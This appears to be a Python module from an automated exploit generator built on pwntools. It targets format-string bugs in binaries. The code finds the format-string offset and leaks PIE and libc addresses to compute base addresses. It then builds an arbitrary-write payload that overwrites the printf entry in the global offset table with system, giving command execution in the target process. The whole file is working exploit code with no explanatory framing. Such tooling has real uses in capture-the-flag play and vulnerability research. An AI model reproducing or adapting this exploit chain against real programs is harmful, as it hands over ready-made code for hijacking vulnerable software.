from exploit_generator.fmt_exploiter import FmtExploiter
from pwn import *


# context.log_level = 'DEBUG'

class FmtFmtExploiter:
    def __init__(self, binary, vuln_details):
        self.binary = binary
        self.fmt_exploiter = FmtExploiter(binary, vuln_details)
        self.globals = vuln_details


    def send_payload_find_offset(self, payload):
        process = self.binary.create_process()
        return self.apply_exploit_input(process, b"", payload)

    def find_fmt_offset(self):
        fmt = FmtStr(self.send_payload_find_offset, numbwritten=self.globals["position"])
        return fmt.offset

    def trim_input(self, input):
        input = input.replace(b'\x00', b'')
        ip = b"F" * self.binary.elf.bytes
        offset = input.index(ip)
        return input[0:offset]

    def get_longest_fmt(self):
        max = 0
        longest_str = b""
        for str in self.globals["input"]:
            nr = str.count(b'F')
            if nr > max:
                max = nr
                longest_str = str
        return longest_str

    def apply_exploit_input(self, proc, leak_payload, fmt_payload=None):
        current_output = b""
        for input in self.globals["input"]:
            current_output += proc.clean()
            fmt = b"F" * self.binary.elf.bytes
            if fmt not in input:
                proc.send(input)
            elif self.get_longest_fmt() == input:
                if self.binary.props["adjusted_binary_base"] is False:
                    if b'|' in current_output:
                        leaked_pie = int(current_output.split(b'|')[1].rstrip(), 16)
                        base_addr = leaked_pie - self.globals["pie_offset"]
                        self.binary.adjust_binary_base(base_addr)
                if self.binary.props["adjusted_libc_base"] is False:
                    if b'|' in current_output:
                        leaked_libc = int(current_output.split(b'|')[2].rstrip(), 16)
                        libc_base = leaked_libc - self.globals["libc_offset"]
                        self.binary.set_libc_base(libc_base)

                fmt_payload = self.fmt_exploiter.arbitrary_write(
                    {self.binary.elf.got['printf']: self.binary.find_function('system', search_libc=True)}) if fmt_payload is None else fmt_payload
                trimmed_input = self.trim_input(input)
                exploit_payload = flat(
                    trimmed_input,
                    fmt_payload
                )
                proc.sendline(exploit_payload)

            elif fmt in input and self.binary.props["adjusted_binary_base"] is False and self.binary.props["adjusted_libc_base"] is False:
                trimmed_input = self.trim_input(input)
                exploit_payload = flat(
                    trimmed_input,
                    leak_payload
                )
                proc.sendline(exploit_payload)

        current_output += proc.clean()
        return current_output

    def got_overwrite_attack(self):
        self.fmt_exploiter.fmt_offset = 0
        proc = self.binary.create_process()
        # proc = gdb.debug(self.binary.bin_path, '''break _start''')
        bin_elf = self.binary.elf

        pie = self.binary.protection["pie"]
        leak_payload = b""
        fmt_payload = b""
        if pie is True:
            pie_payload, pie_offset = self.fmt_exploiter.find_pie_offset()
            self.globals["pie_offset"] = pie_offset
            leak_payload += pie_payload
        if self.binary.props["adjusted_libc_base"] is False:
            libc_payload, libc_offset = self.fmt_exploiter.find_libc_offset()
            self.globals["libc_offset"] = libc_offset
            leak_payload += libc_payload
        leak_payload = leak_payload.replace(b"||", b"|")
        self.apply_exploit_input(proc, leak_payload)

        # self.bof_exploiter.globals = self.globals

        # self.bof_exploiter.ret2dlresolve_exploit(proc)

